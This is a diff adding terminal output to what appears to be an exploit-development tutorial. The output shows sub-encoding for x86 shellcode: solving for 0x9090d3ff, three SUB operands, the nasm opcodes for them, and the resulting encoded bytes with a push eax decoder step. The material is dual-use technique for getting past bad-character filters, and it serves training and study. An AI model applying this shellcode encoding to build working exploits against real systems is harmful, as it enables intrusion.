@@ -284,6 +284,27 @@ So given the reverse order requirement, and the 4 byte requirement, we need to e
 Let's use Z3ncoder. 
 ![](/assets/images/CTP/zen.gif)
 
+```terminal_session
+Solving for 0x9090d3ff
+0xFFFFFFFF - 0x9090d3ff + 1 = 0x6f6f2c01
+###########
+0x217a3e2d
+0x2b7a6e58
+0x227a7f7c
+###########
+Check sum = 0x6f6f2c01
+```
+
+Opcodes:
+```terminal_session
+nasm > sub eax, 0x217a3e2d
+00000000  2D2D3E7A21        sub eax,0x217a3e2d
+nasm > sub eax, 0x2b7a6e58
+00000000  2D586E7A2B        sub eax,0x2b7a6e58
+nasm > sub eax, 0x227a7f7c
+00000000  2D7C7F7A22        sub eax,0x227a7f7c
+```
+
 So our encoded shellcode will be: `\x2D\x2D\x3E\x7A\x21\x2D\x58\x6E\x7A\x2B\x2D\x7C\x7F\x7A\x22`. This will put the value `9090D3FF` into `EAX` once it's decoded. We'll call this variable `subEncode`. 
 
 The last opcode we need to add is `push eax` which will actually decode the shellcode by placing the value held by `EAX` 'ontop' of our adjusted `ESP`. That opcode is simply `\x50`. We'll call this variable `pushEax`.
